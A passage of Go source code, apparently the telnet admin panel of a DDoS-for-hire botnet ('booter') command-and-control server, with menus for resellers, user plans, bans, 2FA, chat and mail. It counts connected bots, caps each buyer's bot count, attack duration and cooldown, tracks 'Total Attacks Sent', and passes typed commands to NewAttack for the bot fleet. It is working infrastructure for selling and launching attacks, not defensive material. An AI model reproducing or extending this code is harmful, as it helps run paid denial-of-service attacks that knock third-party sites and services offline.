			if err != nil {
				return
			}

			days, err := strconv.Atoi(expireDays)
			if err != nil {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mNot a Valid Number!\033[00;0m\r")
				continue
			}

			if database.UserSetPlanExpire(user.Username, time.Now().Add(time.Duration(days)*(time.Hour*24)).Unix()) == false {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mFailed To Update Expiry!\033[00;0m\r")
				continue
			}

			fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;1;95mExpiry Has Been Updated!\033[00;0m\r")
			continue

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		case "chat":

			fmt.Fprintf(this.conn, "\033[00;1;96m║\033[00;1;95mType 'exit' To Leave The Chat!\033[0m\r\n")

			sessionMutex.Lock()
			for _, s := range sessions {
				if s.Chat == true {
					fmt.Fprintf(s.Conn, "\r\n\033[00;1;96m║\033[0m%s\033[00;92m Has Joined The Chat!\033[0m\r\n", username)
				}
			}
			sessionMutex.Unlock()
			session.Chat = true

			for {
				fmt.Fprint(this.conn, "\033[00;1;96m═\033[00;1;95m⮞ ")
				msg, err := this.ReadLine(false)
				if err != nil {
					return
				}

				if msg == "exit" {
					sessionMutex.Lock()
					for _, s := range sessions {
						if s.Chat == true {
							fmt.Fprintf(s.Conn, "\r\n\033[00;1;96m║\033[0m%s\033[31m Has Left The Chat!\033[0m\r\n", username)
						}
					}
					session.Chat = false
					sessionMutex.Unlock()
					break
				}

				sessionMutex.Lock()
				for _, s := range sessions {
					if s.Chat == true && s.Username != username {
						fmt.Fprintf(s.Conn, "\r\033[0m%s\033[00;1;95m⮞ %s\r\n", username, msg)
						fmt.Fprintf(s.Conn, "\033[00;1;96m═\033[00;1;95m⮞ ")
					}
				}
				sessionMutex.Unlock()

			}
			continue

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		case "mfaon":

			if len(userInfo.mfaSecret) < 10 {
				fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[00;1;95mDo You Want 2FA Activated (\033[00;92mY\033[00;1;95m/\033[31mn\033[00;1;95m):\033[0m ")
				confirm, err := this.ReadLine(false)
				if err != nil {
					return
				}

				confirm = strings.ToLower(confirm)

				if confirm != "Y" && confirm != "y" {
					fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mAborted!\033[0m\r")
					continue
				}

				fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[31mFULL SCREEN YOUR PUTTY SCREEN!\033[0m\r\n")
				time.Sleep(5000 * time.Millisecond)
				this.conn.Write([]byte("\033[2J\033[1H"))
				time.Sleep(100 * time.Millisecond)

				secret := GenTOTPSecret()

				totp := gotp.NewDefaultTOTP(secret)

				qr := New()
				qrcode := qr.Get("otpauth://totp/" + url.QueryEscape("Priozo") + ":" + url.QueryEscape(username) + "?secret=" + secret + "&issuer=" + url.QueryEscape("Priozo") + "&digits=6&period=30").Sprint()
				fmt.Fprintln(this.conn, strings.ReplaceAll(qrcode, "\n", "\r\n"))

				fmt.Fprintln(this.conn, "\033[00;1;96mYou Can Scan QR Or Type This Code! APP NAME: Twilio Authy\033[0m\r")
				fmt.Fprintln(this.conn, secret+"\r")

				fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[00;1;95mCode: ")
				code, err := this.ReadLine(false)
				if err != nil {
					return
				}

				if totp.Now() != code {
					fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mInvalid Code!\033[0m\r")
					continue
				}

				if database.UserToggleMfa(username, secret) == false {
					fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mFailed To Enable MFA!\033[0m\r")
					continue
				}

				userInfo.mfaSecret = secret

				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;92mYou Now Have MFA!\033[0m\r")
				continue
			}

			fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mYou Alr Have MFA!\033[0m\r")
			continue

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		case "mfaoff":

			if len(userInfo.mfaSecret) > 1 {
				fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[00;1;95mMFA Code: ")
				code, err := this.ReadLine(false)
				if err != nil {
					return
				}

				totp := gotp.NewDefaultTOTP(userInfo.mfaSecret)

				if totp.Now() != code {
					fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mInvalid Code!\033[0m\r")
					continue
				}

				if database.UserToggleMfa(username, "") == false {
					fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mFailed To Remove MFA!\033[0m\r")
					continue
				}

				userInfo.mfaSecret = ""
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;92mMFA Removed!\033[0m\r")
				continue
			}

			fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mYou Dont Have MFA!\033[0m\r")

			continue

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		case "reseller":

			if userInfo.admin == 0 && userInfo.Reseller == false {
				fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[31mYou Must Be A Reseller!\033[0m\r\n")
				continue
			}

			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m𝗟𝗼𝗴𝗴𝗲𝗱 𝗔𝘀: " + username + "\033[0m\r\n"))
			this.conn.Write([]byte(reseller()))
			this.conn.Write([]byte("\033[0m\r\n"))
			continue

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		case "ddg":

			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte(duckduckgo()))
			continue

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		case "users":

			var i = 0
			for _, s := range sessions {
				i++
				line := fmt.Sprintf("%d, %s", i, censorString(s.Username, "x"))
				fmt.Fprintf(this.conn, "                                \033[00;1;96m║\033[00;1;95m%s\033[0m\r\n", (line))

			}

			continue

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		case "banuser":

			if userInfo.admin == 0 && userInfo.Reseller == false {
				fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[31mYou Must Be A Seller!\033[0m\r\n")
				continue
			}

			if len(args) < 2 {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;1;95mSyntax: banuser (username)\033[0m\r")
				continue
			}

			user, err := database.GetUser(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mInvalid User!\033[0m\r")
				continue
			}

			var subordinate bool
			for _, id := range userInfo.Subordinates {
				if id == user.ID {
					subordinate = true
				}
			}

			if subordinate == false && userInfo.admin == 0 {
				fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[31mThis Isnt Your User!\033[0m\r\n")
				continue
			}

			fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[00;1;95mBan Duration (Days): ")
			banDays, err := this.ReadLine(false)
			if err != nil {
				return
			}

			days, err := strconv.Atoi(banDays)
			if err != nil {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mMust Be An Integer!\033[0m\r")
				continue
			}

			if database.UserTempBan(user.Username, time.Now().Add(time.Duration(days)*(time.Hour*24)).Unix()) == false {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mFailed To Ban User!\033[0m\r")
				continue
			}

			fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;92mBanned User!\033[0m\r")
			continue

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		case "unbanusr":

			if userInfo.admin == 0 && userInfo.Reseller == false {
				fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[31mYou Must Be A Seller!\033[0m\r\n")
				continue
			}

			if len(args) < 2 {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;1;95mSyntax: unbanusr (username)\033[0m\r")
				continue
			}

			user, err := database.GetUser(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mInvalid User!\033[0m\r")
				continue
			}

			var subordinate bool
			for _, id := range userInfo.Subordinates {
				if id == user.ID {
					subordinate = true
				}
			}

			if subordinate == false && userInfo.admin == 0 {
				fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[31mThis Isnt Your User!\033[0m\r\n")
				continue
			}

			if database.UserTempBan(user.Username, time.Now().Add(time.Duration(0)*(time.Hour*24)).Unix()) == false {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mFailed To Unban User!\033[0m\r")
				continue
			}

			fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;92mUser Unbanned!\033[0m\r")
			continue

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		case "bans":

			if userInfo.admin == 0 && userInfo.Reseller == false {
				fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[31mYou Must Be A Seller!\033[0m\r\n")
				continue
			}

			table := simpletable.New()
			var i = 0
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "#"},
					{Align: simpletable.AlignCenter, Text: "Username"},
					{Align: simpletable.AlignCenter, Text: "Admin"},
					{Align: simpletable.AlignCenter, Text: "Mfa"},
					{Align: simpletable.AlignCenter, Text: "Expiry Date"},
					{Align: simpletable.AlignCenter, Text: "Banned For"},
				},
			}

			users, err := database.GetUsers()
			if err != nil {
				fmt.Println(err)
				fmt.Fprintln(this.conn, "ERROR\r")
				continue
			}

			var bannedUsers []User
			for _, user := range users {
				if user.TempBan > time.Now().Unix() {
					bannedUsers = append(bannedUsers, user)
				}
			}

			for _, user := range bannedUsers {

				r := []*simpletable.Cell{
					{Align: simpletable.AlignRight, Text: fmt.Sprint(user.ID)},
					{Text: user.Username},
					{Text: formatBool(user.Admin)},
					{Text: formatBool(user.Mfa())},
					{Text: fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.PlanExpire, 0))).Hours()/24)},
					{Text: fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.TempBan, 0))).Hours()/24)},
				}

				table.Body.Cells = append(table.Body.Cells, r)
				if i%19 == 0 && i != 0 {
					table.SetStyle(simpletable.StyleCompactLite)
					fmt.Fprint(this.conn, "            ")
					fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n            "))
					fmt.Fprintln(this.conn, "\r")

					table.Body.Cells = make([][]*simpletable.Cell, 0)

					this.conn.Read(make([]byte, 10))
					fmt.Fprint(this.conn, "\033c")
				}
			}

			if len(table.Body.Cells) > 0 {
				fmt.Fprintf(this.conn, "\033c")
				table.SetStyle(simpletable.StyleCompactLite)
				fmt.Fprint(this.conn, "            ")
				fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n            "))
				fmt.Fprintln(this.conn, "\r")

			}
			continue

			/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		case "makereseller":

			if userInfo.admin == 0 {
				fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[31mYou Must Be An Seller!\033[0m\r\n")
				continue
			}

			if len(args) < 2 {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;1;95mSyntax: makereseller (username)\033[0m\r")
				continue
			}

			user, err := database.GetUser(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mInvalid User!\033[0m\r")
				continue
			}

			fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[00;1;95m(\033[32m1=Yes\033[00;1;95m) | (\033[31m0=No\033[00;1;95m)\r")
			fmt.Fprintln(this.conn, "\033[0m\r")
			fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[00;1;95mMake Reseller: ")
			zz, err := this.ReadLine(false)
			if err != nil {
				return
			}

			days, err := strconv.Atoi(zz)
			if err != nil {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mMust Be An Integer!\033[0m\r")
				continue
			}

			if database.MakeReseller(user.Username, days) == false {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mFailed To Make Reseller!\033[0m\r")
				continue
			}

			fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;92mUser Given Reseller!\033[0m\r")
			continue

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		case "inbox":

			switch len(args) {
			case 1:
				messages, err := database.FetchMessages(userInfo.ID)
				if err == sql.ErrNoRows {
					fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mYou Have No Mail!\033[0m\r")
					continue
				}

				if len(messages) == 0 {
					fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mYou Have No Mail!\033[0m\r")
					continue
				}

				fmt.Fprintf(this.conn, "%-2v | %-40v | %-20v\r\n", "ID", "Subject", "From")
				var i = 0
				for _, msg := range messages {
					i++
					var senderName = "\033[31mUnknown User\033[0m"
					sender, err := database.GetUserFromID(msg.From)
					if err == nil {
						senderName = sender.Username
					}

					fmt.Fprintf(this.conn, "%-2v | %-40v | %-20v\r\n", i, msg.Subject, senderName)
				}

				fmt.Fprintf(this.conn, "\033[00;1;95m\r\nOpen A Message By Typing %q\r\n", "inbox (ID)")
				fmt.Fprintf(this.conn, "\033[00;1;95mTo Send A Message Type %q\r\n", "msg (username)")
				break
			case 2:
				id, err := strconv.Atoi(args[1])
				if err != nil {
					fmt.Fprintln(this.conn, "                            \033[31mInvalid ID!\033[0m\r")
					continue
				}

				id--

				messages, err := database.FetchMessages(userInfo.ID)
				if err == sql.ErrNoRows {
					fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mInvalid Message ID!\033[0m\r")
					continue
				}

				if len(messages) < id+1 {
					fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mInvalid Message ID!\033[0m\r")
					continue
				}

				msg := messages[id]
				var senderName = "\033[31mUnknown User"
				sender, err := database.GetUserFromID(msg.From)
				if err == nil {
					senderName = sender.Username
				}

				fmt.Fprintf(this.conn, "\033[00;1;95mSubject: \033[0m%s\033[0m\r\n", msg.Subject)
				fmt.Fprintf(this.conn, "\033[00;1;95mFrom: \033[0m%s\033[0m\r\n", senderName)
				fmt.Fprintf(this.conn, "\033[00;1;95mMessage:\033[0m ")
				lines := strings.Split(splitNewline(msg.Content, 44), "\r\n")
				for _, line := range lines {
					fmt.Fprintf(this.conn, "\033[0m%s\033[0m\r\n", line)
				}
			}
			continue

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		case "stats":
			gang := database.RecentUser()
			fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;1;95mTotal Attacks Sent: \033[00;1;95m"+fmt.Sprint(database.getTotalAttacks())+"\033[0m\r")
			fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;1;95mTotal Attacks Running: \033[00;1;95m"+fmt.Sprint(database.getTotalAttacksRunning())+"\033[0m\r")
			fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;1;95mTotal Users: \033[00;1;95m"+fmt.Sprint(database.getTotalUsers())+"\033[0m\r")
			fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;1;95mLast Attacker ID: \033[00;1;95m"+fmt.Sprint(database.LastUserID())+"\033[0m\r")
			this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[00;1;95mOnline Users: %d\033[0m\r", len(sessions))))
			fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;1;95mMost Recent User: \033[00;1;95m"+fmt.Sprint(censorString(gang, "*")))
			fmt.Fprintln(this.conn, "\033[0m\r                                \033[00;1;96m║\033[00;1;95mUptime: \033[00;1;95m100.00%\033[0m\r")
			fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;1;95mUp/Down: \033[00;1;95mUP\033[0m\r")
			continue

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		case "msg":

			if len(args) < 2 {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;1;95mSyntax: msg (username)\033[0m\r")
				continue
			}

			user, err := database.GetUser(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mUser Not Found!\033[0m\r")
				continue
			}

			fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[00;1;95mSubject: ")
			subject, err := this.ReadLine(false)
			if err != nil {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mError!\033[0m\r")
				continue
			}

			if len(subject) > 40 {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mSubject To Long!\033[0m\r")
				continue
			}

			fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[00;1;95mContent: ")
			content, err := this.ReadLine(false)
			if err != nil {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mError!\033[0m\r")
				continue
			}

			if len(content) > 500 {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mMessage To Long!\033[0m\r")
				continue
			}

			fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[00;1;95mSend (\033[00;92mY\033[00;1;95m/\033[31mn\033[00;1;95m):\033[0m ")
			send, err := this.ReadLine(false)
			if err != nil {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mError!\033[0m\r")
				continue
			}

			if send == "YES" || send == "yes" || send == "Y" || send == "y" {
				if err := database.SendMessage(user.ID, userInfo.ID, subject, content); err != nil {
					fmt.Println(err)
					fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mError Sending!\033[0m\r")
					continue
				}

				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;92mMessage Sent!\033[0m\r")

			} else {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mAborted!\033[0m\r")
			}
			continue

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		case "allplans":

			if userInfo.admin == 0 {
				fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[31mYou Must Be A Seller!\033[0m\r\n")
				continue
			}

			if len(args) == 1 {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;1;95mSyntax: allplans add (Days)\033[0m\r")
				continue
			}

			switch args[1] {
			case "add":

				if len(args) != 3 {
					fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;1;95mSyntax: allplans add (Days)\033[0m\r")
					continue
				}

				days, err := strconv.Atoi(args[2])
				if err != nil {
					fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mMust Be An Integer!\033[0m\r")
					continue
				}

				_, err = database.db.Exec("UPDATE `users` SET `planExpire` = `planExpire` + ?", days*86400)
				if err != nil {
					fmt.Println(err)
					fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mError\033[0m\r")
					continue
				}

				fmt.Println("                                \033[00;1;96m║\033[00;1;95mAdded", days, "To All Plans\033[0m")
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;1;95mAll Plans Given Extra "+fmt.Sprint(days)+" Days\033[0m\r")

				break
			default:
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mError!\033[0m\r")
			}
			continue

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		case "myplan":

			user, err := database.GetUserFromID(userInfo.ID)
			if err != nil {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mError!\033[0m\r")
				continue
			}

			if user.Admin == true {
				fmt.Fprintf(this.conn, "                  \033[00;1;96m║\033[00;1;95m%s\033[00;1;96m║\033[0m\r\n", fillSpace(
					fmt.Sprintf("Admin: %s", formatBool(user.Admin)),
					41+9, " "),
				)
			} else {
				fmt.Fprintf(this.conn, "                  \033[00;1;96m║\033[00;1;95m%s\033[00;1;96m║\033[0m\r\n", fillSpace(
					fmt.Sprintf("Admin: %s", formatBool(user.Admin)),
					41+9, " "),
				)
			}

			if user.Mfa() == true {
				fmt.Fprintf(this.conn, "                  \033[00;1;96m║\033[00;1;95m%s\033[00;1;96m║\033[0m\r\n", fillSpace(
					fmt.Sprintf("Mfa: %s", formatBool(user.Mfa())),
					41+9, " "),
				)
			} else {
				fmt.Fprintf(this.conn, "                  \033[00;1;96m║\033[00;1;95m%s\033[00;1;96m║\033[0m\r\n", fillSpace(
					fmt.Sprintf("Mfa: %s", formatBool(user.Mfa())),
					41+9, " "),
				)
			}

			fmt.Fprintf(this.conn, "                  \033[00;1;96m║\033[00;1;95m%s\033[00;1;96m║\033[0m\r\n", fillSpace(
				fmt.Sprintf("Max Time: %d seconds", user.MaxTime),
				41, " "),
			)
			fmt.Fprintf(this.conn, "                  \033[00;1;96m║\033[00;1;95m%s\033[00;1;96m║\033[0m\r\n", fillSpace(
				fmt.Sprintf("Cooldown: %d", user.Cooldown), 41, " "),
			)
			fmt.Fprintf(this.conn, "                  \033[00;1;96m║\033[00;1;95m%s\033[00;1;96m║\033[0m\r\n", fillSpace(
				fmt.Sprintf("Plan Expire: %s", fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(userInfo.planExpire, 0))).Hours()/24)),
				41, " "),
			)
			continue

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		case "sessions":

			if userInfo.admin == 0 {
				fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[31mYou Must Be A Seller!\033[0m\r\n")
				continue
			}

			for _, s := range sessions {
				line := fmt.Sprintf("%d, %s, %s", s.ID, s.Username, s.Conn.RemoteAddr())
				fmt.Fprintf(this.conn, "\033[00;1;96m║\033[00;1;95m%s\033[0m\r\n", (line))
			}
			continue

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		case "who":

			if userInfo.admin == 0 {
				fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[31mYou Must Be A Seller!\033[0m\r\n")
				continue
			}

			for _, s := range sessions {
				if s.Username == username {
					line := fmt.Sprintf("%d, %s", s.ID, s.Conn.RemoteAddr())
					fmt.Fprintf(this.conn, "\033[00;1;96m║\033[00;1;95m%s\033[0m\r\n", (line))
				}
			}
			continue

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		case "listusers":

			if userInfo.admin == 0 && userInfo.Reseller == false {
				fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[31mYou Must Be A Seller!\033[0m\r\n")
				continue
			}

			table := simpletable.New()

			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "#"},
					{Align: simpletable.AlignCenter, Text: "Username"},
					{Align: simpletable.AlignCenter, Text: "Admin"},
					{Align: simpletable.AlignCenter, Text: "Mfa"},
					{Align: simpletable.AlignCenter, Text: "Max Time"},
					{Align: simpletable.AlignCenter, Text: "Plan Expire"},
				},
			}

			users, err := database.GetUsers()
			if err != nil {
				fmt.Println(err)
				fmt.Fprintln(this.conn, "\033[31mError\r")
				continue
			}

			var list []User
			if userInfo.Reseller == true && userInfo.admin == 0 {
				for _, user := range users {

					for _, id := range userInfo.Subordinates {
						if id == user.ID {
							list = append(list, user)
						}
					}
				}
			} else {
				list = users
			}

			fmt.Fprint(this.conn, "\033c")
			for i, user := range list {

				r := []*simpletable.Cell{
					{Align: simpletable.AlignRight, Text: fmt.Sprint(user.ID)},
					{Text: user.Username},
					{Text: formatBool(user.Admin)},
					{Text: formatBool(user.Mfa())},
					{Text: fmt.Sprint(user.MaxTime)},
					{Text: fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.PlanExpire, 0))).Hours()/24)},
				}

				table.Body.Cells = append(table.Body.Cells, r)
				if i%19 == 0 && i != 0 {
					table.SetStyle(simpletable.StyleCompactLite)
					fmt.Fprint(this.conn, "            ")
					fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n            "))
					fmt.Fprintln(this.conn, "\r")

					table.Body.Cells = make([][]*simpletable.Cell, 0)

					this.conn.Read(make([]byte, 10))
					fmt.Fprint(this.conn, "\033c")
				}
			}

			if len(table.Body.Cells) > 0 {
				fmt.Fprintf(this.conn, "\033c")
				table.SetStyle(simpletable.StyleCompactLite)
				fmt.Fprint(this.conn, "            ")
				fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n            "))
				fmt.Fprintln(this.conn, "\r")

			}
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		botCount = userInfo.maxBots

		if userInfo.admin == 1 && cmd == ".ADDUSR" || userInfo.Reseller == true && cmd == ".ADDUSR" {

			user, err := database.GetUserFromID(userInfo.ID)
			if err != nil {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mError\033[00;0m\r")
				continue
			}
			rand.Seed(time.Now().Unix())
			minSpecialChar := 1
			minNum := 1
			minUpperCase := 1
			passwordLength := 12
			new_pw := generatePassword(passwordLength, minSpecialChar, minNum, minUpperCase)
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mUsername:\033[0m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			//pass gen by blazing lmfao
			//pass gen by blazing lmfao
			this.conn.Write([]byte("\r                                \033[00;1;96m║\033[00;1;95mMax Bots:\033[0m "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}

			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mInvalid Botcount!\033[00;0m\r")))
				continue
			}

			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mMax Boot Time:\033[0m "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}

			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mInvalid Attack Duration!\033[00;0m\r")))
				continue
			}

			if duration > user.MaxTime {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mUser Has Higher Time Then You!\033[00;0m\r")
				continue
			}

			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mCooldown (45):\033[0m "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}

			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mInvalid Cooldown!\033[00;0m\r")))
				continue
			}

			if cooldown < user.Cooldown {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mUser Has Lower Cooldown Then You!\033[00;0m\r")
				continue
			}

			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mExpiry Days:\033[0m "))
			planExpireDaysStr, err := this.ReadLine(false)
			if err != nil {
				return
			}

			planExpire, err := strconv.Atoi(planExpireDaysStr)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mInvalid Expiry!\033[00;0m\r")))
				continue
			}

			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mAdd This User? (\033[00;92mY\033[00;1;95m/\033[31mn\033[00;1;95m):\033[0m "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}

			if confirm != "Y" {
				continue
			}

			if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown, planExpire, userInfo.ID) {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mFailed To Create User\033[00;0m\r")))
			} else {
				this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;96m------------------------------------\033[00;0m\r\n"))
				this.conn.Write([]byte("                                \033[00;1;96m║\033[00;92mAccount Has Been Added Successfully\033[00;0m\r\n"))
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[00;1;95mUsername:\033[00;0m %s\r\n ", new_un)))
				this.conn.Write([]byte(fmt.Sprintf("                               \033[00;1;96m║\033[00;1;95mPassword: \033[00;0m%s\r\n ", new_pw)))
				this.conn.Write([]byte("                               \033[00;1;96m║\r\n"))
			}
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if userInfo.Reseller == true && cmd == "BOTS" || userInfo.Reseller == true && cmd == "bots" {

			botCount = clientList.Count()
			this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[00;92m𝑻𝒐𝒕𝒂𝒍 \033[00;1;95m- [\033[00;1;96m%d\033[00;1;95m]\033[0m\r\n", botCount)))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if userInfo.admin == 0 && cmd == "BOTS" || userInfo.admin == 0 && cmd == "bots" {

			botCount = clientList.Count()
			this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[00;92m𝑻𝒐𝒕𝒂𝒍 \033[00;1;95m- [\033[00;1;96m%d\033[00;1;95m]\033[0m\r\n", botCount)))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if userInfo.admin == 1 && cmd == "BOTS" || userInfo.admin == 1 && cmd == "bots" {

			botCount = clientList.Count()
			m := clientList.Distribution()
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[00;1;95m%s - [\033[00;1;96m%d\033[00;1;95m]\033[0m\r\n", k, v)))
			}
			this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[00;92m𝑻𝒐𝒕𝒂𝒍 \033[00;1;95m- [\033[00;1;96m%d\033[00;1;95m]\033[0m\r\n", botCount)))
			continue
		}

		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				continue
			}

			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[00;1;95mBotcount Is Over Max Count\033[0m\r\n")))
				continue
			}

			/*--------------------------------------------------------------------------------------------------------------------------------------------*/

			cmd = countSplit[1]

		}
		if userInfo.admin == 1 && cmd[0] == '@' {
			cataSplit := strings.SplitN(cmd, " ", 2)
			botCatagory = cataSplit[0][1:]
			cmd = cataSplit[1]
		}

		atk, err := NewAttack(cmd, userInfo.admin)
		botCount = clientList.Count()
		if err != nil {
